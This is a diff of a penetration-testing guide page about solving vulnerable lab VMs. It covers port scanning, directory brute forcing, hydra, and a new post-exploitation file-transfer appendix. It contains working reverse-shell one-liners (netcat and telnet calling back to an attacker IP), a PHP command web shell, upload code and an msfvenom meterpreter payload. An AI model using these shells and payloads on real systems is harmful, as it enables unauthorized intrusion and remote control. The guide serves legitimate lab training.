@@ -68,7 +68,7 @@
 <li><a class="reference internal" href="#amap-application-mapper">Amap - Application mapper</a></li>
 </ul>
 </li>
-<li><a class="reference internal" href="#rabbit-holes">Rabbit Holes?</a><ul>
+<li><a class="reference internal" href="#rabbit-holes">Rabbit Holes</a><ul>
 <li><a class="reference internal" href="#listen-to-the-interface">Listen to the interface</a></li>
 <li><a class="reference internal" href="#dns-server">DNS Server</a></li>
 <li><a class="reference internal" href="#ssl-certificate">SSL Certificate</a></li>
@@ -110,14 +110,14 @@
 </ul>
 </li>
 <li><a class="reference internal" href="#spawning-a-tty-shell">Spawning a TTY Shell</a><ul>
-<li><a class="reference internal" href="#id9">Python</a></li>
+<li><a class="reference internal" href="#id10">Python</a></li>
 <li><a class="reference internal" href="#sh">sh</a></li>
-<li><a class="reference internal" href="#id10">Perl</a></li>
-<li><a class="reference internal" href="#id11">Ruby</a></li>
+<li><a class="reference internal" href="#id11">Perl</a></li>
+<li><a class="reference internal" href="#id12">Ruby</a></li>
 <li><a class="reference internal" href="#lua">Lua</a></li>
 <li><a class="reference internal" href="#irb">IRB</a></li>
 <li><a class="reference internal" href="#vi">VI</a></li>
-<li><a class="reference internal" href="#id12">Nmap</a></li>
+<li><a class="reference internal" href="#id13">Nmap</a></li>
 <li><a class="reference internal" href="#expect">Expect</a></li>
 <li><a class="reference internal" href="#sneaky-stealthy-su-in-web-shells">Sneaky Stealthy SU in (Web) Shells</a></li>
 </ul>
@@ -246,7 +246,7 @@
 <li><a class="reference internal" href="#login-pages">Login-Pages</a></li>
 <li><a class="reference internal" href="#delete-tags">Delete Tags</a></li>
 <li><a class="reference internal" href="#http-404-custom-page">HTTP 404 Custom Page</a></li>
-<li><a class="reference internal" href="#id20">PHP</a></li>
+<li><a class="reference internal" href="#id21">PHP</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#docker-security">Docker Security</a><ul>
@@ -296,7 +296,7 @@
 <li><a class="reference internal" href="#metasploit-shell-upgrade">Metasploit shell upgrade</a></li>
 <li><a class="reference internal" href="#truecrypt-files">Truecrypt Files</a></li>
 <li><a class="reference internal" href="#grep-in-input-box">Grep in input box?</a></li>
-<li><a class="reference internal" href="#id23">Others</a></li>
+<li><a class="reference internal" href="#id24">Others</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#cyber-deception">Cyber-Deception</a><ul>
@@ -335,6 +335,32 @@
 <li><a class="reference internal" href="#simple-file-upload">Simple File Upload</a></li>
 <li><a class="reference internal" href="#simple-file-upload-with-verifying-image-type">Simple File Upload - With verifying image type</a></li>
 <li><a class="reference internal" href="#modifying-file-upload-page">Modifying File Upload Page</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a class="reference internal" href="#appendix-iii-transferring-files-from-linux-to-windows-post-exploitation">Appendix-III Transferring Files from Linux to Windows (post-exploitation)</a><ul>
+<li><a class="reference internal" href="#smb">SMB</a><ul>
+<li><a class="reference internal" href="#smb-server-attacker">SMB Server - Attacker</a></li>
+<li><a class="reference internal" href="#accessing-the-share-linux">Accessing the share - Linux</a></li>
+<li><a class="reference internal" href="#accessing-the-share-windows">Accessing the share - Windows</a></li>
+<li><a class="reference internal" href="#copying-the-files-windows">Copying the Files - Windows</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#id30">HTTP</a><ul>
+<li><a class="reference internal" href="#setting-up-the-server">Setting up the Server</a></li>
+<li><a class="reference internal" href="#accessing-the-server-windows">Accessing the Server - Windows</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#ftp">FTP</a><ul>
+<li><a class="reference internal" href="#id31">Setting up the Server</a></li>
+<li><a class="reference internal" href="#access-using-ftp">Access using FTP</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#tftp">TFTP</a><ul>
+<li><a class="reference internal" href="#id32">Setting up the Server</a></li>
+<li><a class="reference internal" href="#accessing-the-share">Accessing the Share</a></li>
+<li><a class="reference internal" href="#installing-tftp-windows">Installing tftp - Windows</a></li>
 </ul>
 </li>
 </ul>
@@ -379,11 +405,16 @@
 <ul class="simple">
 <li><a class="reference internal" href="#finding-the-ip-address"><span class="std std-ref">Finding the IP address</span></a></li>
 <li><a class="reference internal" href="#port-scanning"><span class="std std-ref">Port Scanning</span></a></li>
-<li><a class="reference internal" href="#rabbit-holes"><span class="std std-ref">Rabbit Holes?</span></a></li>
+<li><a class="reference internal" href="#rabbit-holes"><span class="std std-ref">Rabbit Holes</span></a></li>
 <li><a class="reference internal" href="#from-nothing-to-unprivileged-shell"><span class="std std-ref">From Nothing to a Unprivileged Shell</span></a></li>
 <li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell"><span class="std std-ref">Unprivileged Shell to Privileged Shell</span></a></li>
 </ul>
-<p>In this blog post, we have mentioned, what can be done in each separate stage. Furthermore, we have also provided <a class="reference internal" href="#tips-and-tricks"><span class="std std-ref">Tips and Tricks</span></a> for solving vulnerable VMs. Additionally <a class="reference internal" href="LFF-IPS-P2-VulnerabilityAnalysis.html"><span class="doc">Infrastructure PenTest Series : Part 2 - Vulnerability Analysis</span></a> could be referred for exploitation of any particular services (i.e. it provides information such as “If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited”). Lastly there are also appendixes related to <a class="reference internal" href="#a1-local-file-inclusion"><span class="std std-ref">Appendix-I : Local File Inclusion</span></a> and <a class="reference internal" href="#a2-file-upload"><span class="std std-ref">Appendix-II : File Upload</span></a>.</p>
+<p>In this blog post, we have mentioned, what can be done in each separate stage. Furthermore, we have also provided <a class="reference internal" href="#tips-and-tricks"><span class="std std-ref">Tips and Tricks</span></a> for solving vulnerable VMs. Additionally <a class="reference internal" href="LFF-IPS-P2-VulnerabilityAnalysis.html"><span class="doc">Infrastructure PenTest Series : Part 2 - Vulnerability Analysis</span></a> could be referred for exploitation of any particular services (i.e. it provides information such as “If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited”). Lastly there are also appendixes related to</p>
+<ul class="simple">
+<li><a class="reference internal" href="#a1-local-file-inclusion"><span class="std std-ref">Appendix-I : Local File Inclusion</span></a></li>
+<li><a class="reference internal" href="#a2-file-upload"><span class="std std-ref">Appendix-II : File Upload</span></a></li>
+<li><a class="reference internal" href="#a3-tranfer-files-from-linux-to-windows"><span class="std std-ref">Appendix-III Transferring Files from Linux to Windows (post-exploitation)</span></a></li>
+</ul>
 <div class="section" id="finding-the-ip-address">
 <span id="id2"></span><h2>Finding the IP address<a class="headerlink" href="#finding-the-ip-address" title="Permalink to this headline">¶</a></h2>
 <p>Before, exploiting any machine, we need to figure out its IP address.</p>
@@ -453,10 +484,11 @@ MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, scrip
 <div class="section" id="unicornscan">
 <h3>Unicornscan<a class="headerlink" href="#unicornscan" title="Permalink to this headline">¶</a></h3>
 <p>A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively short time frame.</p>
-<p>As unicornscan is faster then nmap it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written a script for this available at <a class="reference external" href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>
+<p>As unicornscan is faster then nmap it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written <a class="reference external" href="https://github.com/superkojiman/onetwopunch">onetwopunch</a> for this.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>unicornscan [options] X.X.X.X/YY:S-E
   -i, --interface : interface name, like eth0 or fxp1, not normally required
   -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf&#39; for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
+
   Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied.
   Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024
 
@@ -471,6 +503,7 @@ MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, scrip
 <h4>TCP Scan<a class="headerlink" href="#tcp-scan" title="Permalink to this headline">¶</a></h4>
 <p>For a TCP scan, the format is:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nc -vvn -z xxx.xxx.xxx.xxx startport-endport
+
    -z flag is Zero-I/O mode (used for scanning)
    -vv will provide verbose information about the results
    -n flag allows to skip the DNS lookup
@@ -489,7 +522,7 @@ MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, scrip
 <div class="section" id="amap-application-mapper">
 <h3>Amap - Application mapper<a class="headerlink" href="#amap-application-mapper" title="Permalink to this headline">¶</a></h3>
 <p>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you which application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.</p>
-<p>By using <strong>amap</strong>, we can identify which services are running on a given port. For example is there a SSL server running on port 3445 or some oracle listener on port 23? Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect followed by trying to identify the SSL-enabled protocol!  One of the vulnhub VM’s for example was running http and https on the same port.</p>
+<p>By using <strong>amap</strong>, we can identify which services are running on a given port. For example is there a SSL server running on port 3445 or some oracle listener on port 23? Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect followed by trying to identify the SSL-enabled protocol!. e.g.  One of the vulnhub VM’s was running http and https on the same port.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>amap -A 192.168.1.2 12380
 amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
 Protocol on 192.168.1.2:12380/tcp matches http
@@ -503,7 +536,7 @@ amap v5.4 finished at 2016-08-10 05:48:16
 </div>
 </div>
 <div class="section" id="rabbit-holes">
-<span id="id5"></span><h2>Rabbit Holes?<a class="headerlink" href="#rabbit-holes" title="Permalink to this headline">¶</a></h2>
+<span id="id5"></span><h2>Rabbit Holes<a class="headerlink" href="#rabbit-holes" title="Permalink to this headline">¶</a></h2>
 <p>There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues on how to get unstuck.</p>
 <div class="admonition note">
 <p class="first admonition-title">Note</p>
@@ -552,7 +585,7 @@ scanme.nmap.org has IPv6 address 2600:3c01::f03c:91ff:fe18:bb2f
 </div>
 <div class="section" id="ssl-certificate">
 <h3>SSL Certificate<a class="headerlink" href="#ssl-certificate" title="Permalink to this headline">¶</a></h3>
-<p>If the targeted machine is running an https server and we are getting an apache default webpage on hitting the <a class="reference external" href="https://IPAddress">https://IPAddress</a>, vhosts are probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file (/etc/hosts) and check what is being hosted on these domain names by surfing to <a class="reference external" href="https://alt-dns-name">https://alt-dns-name</a>.</p>
+<p>If the targeted machine is running an https server and we are getting an apache default webpage on hitting the <a class="reference external" href="https://IPAddress">https://IPAddress</a>, virtual hosts would be probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file (/etc/hosts) and check what is being hosted on these domain names by surfing to <a class="reference external" href="https://alt-dns-name">https://alt-dns-name</a>.</p>
 <p>nmap service scan result for port 443 (sample)</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>| ssl-cert: Subject: commonName=examplecorp.com/organizationName=ExampleCorp Ltd./stateOrProvinceName=Attica/countryName=IN/localityName=Mumbai/organizationalUnitName=IT/emailAddress=admin@examplecorp.com
 | Subject Alternative Name: DNS:www.examplecorp.com, DNS:admin-portal.examplecorp.com
@@ -562,7 +595,7 @@ scanme.nmap.org has IPv6 address 2600:3c01::f03c:91ff:fe18:bb2f
 </div>
 <div class="section" id="from-nothing-to-a-unprivileged-shell">
 <span id="from-nothing-to-unprivileged-shell"></span><h2>From Nothing to a Unprivileged Shell<a class="headerlink" href="#from-nothing-to-a-unprivileged-shell" title="Permalink to this headline">¶</a></h2>
-<p>At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (eg certain cms’s)</p>
+<p>At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (e.g. certain cms’s)</p>
 <div class="section" id="searchsploit">
 <h3>searchsploit<a class="headerlink" href="#searchsploit" title="Permalink to this headline">¶</a></h3>
 <p>Exploit Database Archive Search</p>
@@ -605,7 +638,7 @@ Webmin 1.x HTML Email Command Execution Vulnerability                           
 </div>
 <div class="section" id="seclists-org-security-mailing-list-archive">
 <h3>SecLists.Org Security Mailing List Archive<a class="headerlink" href="#seclists-org-security-mailing-list-archive" title="Permalink to this headline">¶</a></h3>
-<p>There will be some days, when you won’t find vulnerabilities with searchsploit. In this case, we should also check the <a class="reference external" href="http://seclists.org/">seclists.org security mailing list google search</a>, if someone has reported any bug(s) for that particular software that we can exploit.</p>
+<p>There will be some days, when you won’t find vulnerabilities with searchsploit. In this case, we should also check the <a class="reference external" href="http://seclists.org/">SecLists.Org Security Mailing List Archive</a>, if someone has reported any bug(s) for that particular software that we can exploit.</p>
 </div>
 <div class="section" id="google-vulns">
 <h3>Google-Vulns<a class="headerlink" href="#google-vulns" title="Permalink to this headline">¶</a></h3>
@@ -637,7 +670,7 @@ http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,ci
 <h4>dirb, wfuzz, dirbuster<a class="headerlink" href="#dirb-wfuzz-dirbuster" title="Permalink to this headline">¶</a></h4>
 <p>Furthermore, we can run the following programs to find any hidden directories.</p>
 <ul class="simple">
-<li><a class="reference external" href="https://tools.kali.org/web-applications/dirb">DIRB</a> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.</li>
+<li><a class="reference external" href="https://tools.kali.org/web-applications/dirb">DIRB</a> is a Web Content Scanner. It looks for existing (and/ or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.</li>
 <li><a class="reference external" href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let’s say, when we dirb we get 50 directories. Each directory containing an image. Often, we then need to figure out which image is different. In this case, we would figure out what’s the size of the normal image and hide that particular response with wfuzz.</li>
 <li><a class="reference external" href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">Dirbuster</a> : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers.</li>
 </ul>
@@ -647,7 +680,7 @@ http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,ci
 </div>
 <div class="admonition tip">
 <p class="first admonition-title">Tip</p>
-<p class="last">If using the dirb/ wfuzz wordlist doesn’t result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.</p>
+<p class="last">If using the dirb/ wfuzz wordlist doesn’t result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories. Also, it sometimes make sense to dirb/wfuzz the IPAddress instead of the hostname like filesrv.example.com (Maybe found by automatic redirect)</p>
 </div>
 <div class="admonition-todo admonition" id="index-0">
 <p class="first admonition-title">Todo</p>
@@ -694,7 +727,7 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 * Connection #0 to host 192.168.126.129 left intact
 </pre></div>
 </div>
-<p>The PUT method allows you to upload a file. Which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a></p>
+<p>The PUT method allows you to upload a file which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a></p>
 <p>A few are:</p>
 <ul class="simple">
 <li>Nmap:</li>
@@ -713,6 +746,9 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 </div>
 <p>or</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>curl -X PUT -d &#39;
+curl -i -X PUT -H &quot;Content-Type: application/xml; charset=utf-8&quot; -d @&quot;/tmp/some-file.xml&quot; http://IPAddress/newpage
+curl -X PUT -d &quot;text or data to put&quot; http://IPAddress/destination_page
+curl -i -H &quot;Accept: application/json&quot; -X PUT -d &quot;text or data to put&quot; http://IPAddress/new_page
 </pre></div>
 </div>
 </div></blockquote>
@@ -744,7 +780,7 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 <div class="highlight-None"><div class="highlight"><pre><span></span>wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
 </pre></div>
 </div>
-<p>Tips</p>
+<p><strong>Tips</strong></p>
 <ul class="simple">
 <li>If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible ways is to go to Appearance &gt; Editor &gt; Edit 404 Template.</li>
 <li>The configuration of worpdress is normally speaking stored in <strong>wp-config.php</strong>. If you are able to download it, you might be lucky and be able to loot plaintext username and passwords to the database or wp-admin page.</li>
@@ -759,20 +795,19 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 </div></blockquote>
 <div class="admonition-todo admonition" id="index-1">
 <p class="first admonition-title">Todo</p>
-<p class="last">what is the (standard) format of a wp hash and where in the database is it stored?</p>
+<p class="last">what is the (standard) format of a wp hash and where in the database is it stored? Elborate more on wp scanning and vulnerabilities?</p>
 </div>
-<p><strong>todo: elborate more on wp scanning and vulnerabilities?</strong></p>
 </div>
 <div class="section" id="names-possible-usernames-passwords">
 <h4>Names? Possible Usernames &amp; Passwords?<a class="headerlink" href="#names-possible-usernames-passwords" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.</p>
+<p>Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.</p>
 <p>If the vulnerable machine is running a SMTP mail server, we can verify if a particular username exists or not.</p>
 <ul class="simple">
 <li>Using metasploit smtp_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.</li>
 <li>Using VRFY command:</li>
 <li>Using RCPT TO command:</li>
 </ul>
-<p>Once we have identified a pattern, we may modify namemash.py to generate usernames and check if they exist or not.</p>
+<p>Once we have identified a pattern of username creation, we may modify namemash.py to generate usernames and check if they exist or not.</p>
 </div>
 <div class="section" id="brute-forcing-hydra">
 <h4>Brute forcing: hydra<a class="headerlink" href="#brute-forcing-hydra" title="Permalink to this headline">¶</a></h4>
@@ -825,24 +860,20 @@ C=/page/uri          to define a different page to gather initial cookies from
 </div>
 <div class="admonition-todo admonition" id="index-2">
 <p class="first admonition-title">Todo</p>
-<p class="last">add a program/binary that an easier syntax, ncrack maybe?</p>
-</div>
-<div class="admonition-todo admonition" id="index-3">
-<p class="first admonition-title">Todo</p>
-<p class="last">eloborate on the examples, eg. what they will do once executed?</p>
+<p class="last">Add a program/binary that an easier syntax, ncrack maybe? Elaborate on the examples, eg. what they will do once executed?</p>
 </div>
 </div>
 </div>
 <div class="section" id="reverse-shells">
 <h3>Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permalink to this headline">¶</a></h3>
-<p>Once we have figured out some vulnerability or misconfiguration in a running service. Which allows us to make a connection back to our attack machine we would like to set up a reverse shell. This can be done through version methods eg by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and more.</p>
+<p>Once we have figured out some vulnerability or misconfiguration in a running service which allows us to make a connection back to our attack machine, we would like to set up a reverse shell. This can be done through version methods e.g. by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and more.</p>
 <div class="section" id="netcat-nc">
 <h4>netcat (nc)<a class="headerlink" href="#netcat-nc" title="Permalink to this headline">¶</a></h4>
 <ul class="simple">
 <li>with the -e option</li>
 </ul>
 <blockquote>
-<div><div class="highlight-None"><div class="highlight"><pre><span></span>nc -e /bin/sh 10.0.0.1 1234
+<div><div class="highlight-None"><div class="highlight"><pre><span></span>nc -e /bin/sh 10.1.1.1 4444
 </pre></div>
 </div>
 </div></blockquote>
@@ -864,9 +895,9 @@ C=/page/uri          to define a different page to gather initial cookies from
 <ul class="simple">
 <li><strong>PHP Web Shell</strong></li>
 </ul>
-<p>This is a kind of Web shell and not a reverse shell.</p>
 <blockquote>
-<div><p>We can create a new file say (shell.php) on the server containing</p>
+<div><p>This is a kind of Web shell and not a reverse shell.</p>
+<p>We can create a new file say (shell.php) on the server containing</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;
 </pre></div>
 </div>
@@ -890,10 +921,11 @@ C=/page/uri          to define a different page to gather initial cookies from
 -b, --cookie &lt;data&gt; (HTTP) Passes the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a &quot;Set-Cookie:&quot; line.  The data should be in the format &quot;NAME1=VALUE1; NAME2=VALUE2&quot;.
 </pre></div>
 </div>
-<div class="admonition-todo admonition" id="index-4">
-<p class="first admonition-title">Todo</p>
-<p class="last">explain the sed command at the end of the command given above</p>
+<p>The sed command in the end</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>sed &#39;/&lt;html&gt;/,/&lt;\/html&gt;/d&#39;
+</pre></div>
 </div>
+<p>deletes the content between &lt;html&gt; and &lt;/html&gt; tag.</p>
 <p>If you also want to provide upload functionality (imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>&lt;?php
  if (isset($_REQUEST[&#39;fupload&#39;])) {
@@ -905,17 +937,24 @@ C=/page/uri          to define a different page to gather initial cookies from
 ?&gt;
 </pre></div>
 </div>
+<p>The above can be accessed by</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/shell.php?fupload=filename_on_your_webserver
+</pre></div>
+</div>
 </div></blockquote>
 <ul class="simple">
 <li><strong>PHP Meterpreter</strong></li>
 </ul>
 <blockquote>
 <div><p>We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.</p>
-<div class="admonition-todo admonition" id="index-5">
-<p class="first admonition-title">Todo</p>
-<p class="last">explain how to set up a multi handler</p>
-</div>
 <div class="highlight-None"><div class="highlight"><pre><span></span>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
+</pre></div>
+</div>
+<p>We can set the multi-handler in metasploit by</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST yourIP
+run
 </pre></div>
 </div>
 </div></blockquote>
@@ -940,9 +979,11 @@ C=/page/uri          to define a different page to gather initial cookies from
 <div class="highlight-None"><div class="highlight"><pre><span></span>weevely http://192.168.1.2/location_of_payload password
 </pre></div>
 </div>
-<p>However, it was not as useful as php meterpreter or a reverse shell.
-.. Todo:: elobrate -&gt; why wasn’t it usefull?
-.. Todo:: iirc (really not sure) if you don’t provide a password it will ask for it</p>
+<p>However, it was not as useful as php meterpreter or a reverse shell.</p>
+<div class="admonition-todo admonition" id="index-3">
+<p class="first admonition-title">Todo</p>
+<p class="last">Elobrate -&gt; why wasn’t it useful? iirc (really not sure) if you don’t provide a password it will ask for it</p>
+</div>
 </div>
 <div class="section" id="ruby">
 <h4>Ruby<a class="headerlink" href="#ruby" title="Permalink to this headline">¶</a></h4>
@@ -1043,9 +1084,11 @@ Connection: close
 <div class="highlight-None"><div class="highlight"><pre><span></span>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p
 
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
-
-.. Todo:: explain the example above
 </pre></div>
+</div>
+<div class="admonition-todo admonition" id="index-4">
+<p class="first admonition-title">Todo</p>
+<p class="last">explain the example above</p>
 </div>
 </div>
 <div class="section" id="xterm">
@@ -1110,10 +1153,7 @@ select 0x3c3f70687020706870696e666f28293b203f3e into outfile &quot;/var/www/html
 </pre></div>
 </div>
 </div></blockquote>
-<ul class="simple">
-<li>Upload ncat and execute</li>
-</ul>
-<div class="admonition-todo admonition" id="index-6">
+<div class="admonition-todo admonition" id="index-5">
 <p class="first admonition-title">Todo</p>
 <p class="last">add Nishang?</p>
 </div>
@@ -1153,10 +1193,10 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </div>
 </div>
 <div class="section" id="spawning-a-tty-shell">
-<span id="id7"></span><h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permalink to this headline">¶</a></h3>
+<span id="id8"></span><h3>Spawning a TTY Shell<a class="headerlink" href="#spawning-a-tty-shell" title="Permalink to this headline">¶</a></h3>
 <p>Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. <a class="reference external" href="https://netsec.ws/?p=337">Spawning a TTY Shell</a> and <a class="reference external" href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">Post-Exploitation Without A TTY</a> have provided multiple ways to get a tty shell</p>
-<div class="section" id="id9">
-<h4>Python<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id10">
+<h4>Python<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
 </pre></div>
 </div>
@@ -1174,8 +1214,8 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </pre></div>
 </div>
 </div>
-<div class="section" id="id10">
-<h4>Perl<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id11">
+<h4>Perl<a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>perl -e <span class="s1">&#39;exec &quot;/bin/sh&quot;;&#39;</span>
 </pre></div>
 </div>
@@ -1183,8 +1223,8 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </pre></div>
 </div>
 </div>
-<div class="section" id="id11">
-<h4>Ruby<a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id12">
+<h4>Ruby<a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>ruby: <span class="nb">exec</span> <span class="s2">&quot;/bin/sh&quot;</span>
 </pre></div>
 </div>
@@ -1218,8 +1258,8 @@ mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0&lt;/tmp/cdniov | /bin/sh &gt;/
 </div>
 <p>Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.</p>
 </div>
-<div class="section" id="id12">
-<h4>Nmap<a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id13">
+<h4>Nmap<a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h4>
 <p>(From within nmap)</p>
 <div class="highlight-bash"><div class="highlight"><pre><span></span>!sh
 </pre></div>
@@ -1308,7 +1348,7 @@ isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echo
 <div class="highlight-None"><div class="highlight"><pre><span></span>stty raw -echo
 </pre></div>
 </div>
-<p>With a raw stty, input/output will look weird and you won’t see the next commands, but as you type they are being processed.</p>
+<p>With a raw stty, input/ output will look weird and you won’t see the next commands, but as you type they are being processed.</p>
 <p>Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.</p>
 <p>After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>$ export SHELL=bash
@@ -1403,7 +1443,7 @@ bash: cd: restricted
 <blockquote>
 <div><ul class="simple">
 <li>If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc…).</li>
-<li>If the PATH is writeable, then you’ll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.</li>
